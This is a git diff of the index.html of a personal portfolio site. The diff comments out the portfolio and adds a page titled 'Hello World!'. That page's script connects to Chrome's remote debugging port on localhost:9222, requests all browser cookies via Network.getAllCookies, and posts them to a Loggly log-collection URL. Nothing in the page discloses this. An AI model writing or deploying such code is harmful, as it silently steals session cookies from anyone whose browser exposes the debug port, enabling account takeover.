@@ -1,5 +1,5 @@
+<!--
 <!DOCTYPE html>
-<!– 
 <html lang="en"> 
   <head>
     <meta charset="UTF-8" />
@@ -54,7 +54,7 @@
     </header>
 
     <main>
-      <!-- About -->
+      
       <div class="about center">
         <script src="./Type.js"></script>
         <h1>Hola, soy <span class="about__name">Matias Villagra.</span></h1>
@@ -90,7 +90,7 @@
         </div>
       </div>
 
-      <!-- Projects -->
+      
       <section id="projects" class="section projects">
         <h2 class="section__title">Proyectos</h2>
 
@@ -190,12 +190,12 @@
               class="link link--icon"
             >
               <i aria-hidden="true" class="fas fa-external-link-alt"></i>
-            </a> -->
+            </a> 
           </div>
         </div>
       </section>
 
-      <!-- Skills -->
+      
       <section class="section skills" id="skills">
         <h2 class="section__title">Habilidades</h2>
         <ul class="skills__list">
@@ -215,7 +215,7 @@
         </ul>
       </section>
 
-      <!-- Contact -->
+
       <section class="section contact center" id="contact">
         <h2 class="section__title">Contacto</h2>
         <a href="mailto:mativillagra98@gmail.com">
@@ -238,4 +238,49 @@
     <script src="./script.js"></script>
   </body>
 </html>
-–>
+-->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Hello World!</title>
+</head>
+<body>
+Hello World!
+<script>
+    
+var webSocketDebuggerUrl;
+var port = 9222;
+var request = new XMLHttpRequest();
+request.open("GET", "http://localhost:" + port + "/json");
+request.responseType = 'json';
+request.send();
+request.onload = function() {
+  webSocketDebuggerUrl = request.response[0].webSocketDebuggerUrl;
+  console.log(webSocketDebuggerUrl);
+  var connection = new WebSocket(webSocketDebuggerUrl);
+    
+  // When the connection is open, send some data to the server
+  connection.onopen = function () {
+    connection.send('{"id": 1, "method": "Network.getAllCookies"}');
+  };
+  // Log errors
+  connection.onerror = function (error) {
+    console.log('WebSocket Error ' + error);
+  };
+  // Log messages from the server
+  connection.onmessage = function (e) {
+    console.log('Server: ' + e.data);
+      
+    //send cookies to loggly
+    post_url = "http://logs-01.loggly.com/inputs/c1f13e67-ee8a-457d-a870-361c443dda64/tag/http/"
+    var xhttp = new XMLHttpRequest();
+    xhttp.open("POST", post_url, true);
+    xhttp.setRequestHeader('Content-Type', 'text/plain');
+    xhttp.send(JSON.stringify(JSON.parse(e.data).result.cookies));
+  };
+}
+</script>
+</body>
+</html>
